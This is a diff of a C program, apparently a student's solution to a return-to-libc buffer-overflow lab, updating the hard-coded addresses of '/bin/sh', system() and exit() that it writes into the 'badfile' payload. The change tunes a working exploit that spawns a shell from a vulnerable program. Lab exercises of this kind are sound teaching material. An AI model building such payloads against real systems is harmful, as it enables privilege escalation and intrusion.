@@ -27,9 +27,9 @@ void main(int argc, char **argv)
 	/* You need to fill the buffer with appropriate contents here */
 	/* ... Put your code here ... */
 	long *tmp = (long *) buffer;
-	*(tmp + 11) = 0xb7ec582b;   //  "/bin/sh"
-	*(tmp + 9) = 0xb7da4da0;   //  system()
-	*(tmp + 10) = 0xb7d989d0;   //  exit()
+	*(tmp + 11) = 0xb7f6382b;//0xb7ec582b;   //  "/bin/sh"
+	*(tmp + 9) = 0xb7e42da0;//0xb7da4da0;   //  system()
+	*(tmp + 10) = 0xb7e369d0;//0xb7d989d0;   //  exit()
 	
 	/* Save the contents to the file "badfile" */
 	badfile = fopen("./badfile", "w");
